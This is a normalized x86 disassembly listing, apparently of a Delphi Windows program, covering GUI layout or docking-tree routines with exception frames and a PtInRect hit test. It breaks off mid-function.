call sub_40b7c8
call sub_403928
sub_455fa0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403370
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_456011
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_44e334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_456024
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_4562a4
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_456054
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_455e04
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455e04
mov esi eax
push ebp
call sub_456024
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4562a4
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455d98
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_455d98
mov ecx ebx
pop edx
call sub_416c78
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44cff4
mov eax [ ebp - 0x4 ]
call sub_4561cc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_4561cc
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4561cc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_4561cc
push ebx
mov ebx eax
mov eax ebx
call sub_455cd4
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_455c5c
test al al
je r-xdata
mov eax ebx
call sub_455d08
pop ebx
retn
sub_456208
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4561f4
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_455ca4
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4561f8
mov edx esi
call sub_456208
sub_456244
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4561cc
mov edi eax
mov eax ebx
call sub_455d08
cmp edi eax
jl r-xdata
mov eax esi
call sub_455eb4
mov eax [ esi + 0x1c ]
push eax
push sub_457d54
mov edx esi
call sub_456580
mov eax ebx
call sub_4561cc
mov edi eax
mov eax esi
call sub_455d50
cmp edi eax
jle r-xdata
mov eax ebx
call sub_456244
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4562b0
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_455cd4
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_4562d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403144
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4034c0
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455c80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424068
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_429254
mov edx eax
mov eax ebx
call sub_4241e4
mov eax [ ebp - 0x4 ]
call sub_4564a8
xor eax eax
push ebp
push sub_4563e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_450b4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_455eb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4563eb
mov eax [ ebp - 0x4 ]
call sub_4564ac
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_450b10
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4563eb
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_45827c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_456440
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_4574ac
mov eax [ esi + 0x10 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4564c0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_4564c0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_4564c0
pop ecx
sub_456518
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_4564c0
pop ecx
sub_456544
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_456544
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_456544
pop ecx
sub_456598
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_456518
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_455e04
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_455e04
push eax
mov edx 0x1
mov eax ebx
call sub_455d98
push eax
mov edx 0x2
mov eax ebx
call sub_455d98
pop edx
pop ecx
call sub_416c78
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b80
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45661c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_456054
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416c78
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cff4
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455c80
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_456518
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_455ca4
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_457544
mov edx esi
mov eax ebx
call sub_456518
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_44d5d8
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455c80
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_44d5c4
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_455e04
mov edx eax
mov eax edi
call sub_4561f4
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_455e04
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_455e04
mov edx eax
mov eax edi
call sub_4561f4
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_455e04
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_45682c
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4569d4
jmp r-xdata
sub_45682c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_455c80
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_4561cc
mov edx eax
mov eax ebx
call sub_4561f4
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_4561f4
mov eax [ esi + 0x64 ]
call sub_4561cc
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_45789c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_456580
mov eax [ esi + 0x64 ]
call sub_4561cc
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_45789c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_456580
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_457c20
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_456580
mov eax [ esi + 0x64 ]
call sub_4561cc
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_457d54
xor edx edx
mov eax esi
call sub_456580
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4561f4
adc edx 0x0
mov eax ebx
call sub_455eb4
mov eax ebx
call sub_456244
push esi
push sub_457d54
xor edx edx
mov eax esi
call sub_456580
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_4569d4
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_455eb4
mov eax [ ebx + 0x14 ]
call sub_456244
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_456a4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_4561cc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4561cc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_4561cc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_455d98
mov esi eax
mov edx 0x2
mov eax ebx
call sub_455d98
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_4561cc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_4562a4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4562cc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4562a4
call sub_456a4c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4562cc
call sub_456a4c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_455e04
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_455e04
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_456c78
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_450b4c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_450b10
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_416c28
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456d0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_456c78
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4562cc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_456518
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_4562cc
call sub_456a4c
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_456d94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403eec
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404538
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_456ddc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456fd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_4574ac
mov eax [ ebp - 0x8 ]
call sub_4564a8
xor edx edx
push ebp
push sub_456fb7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
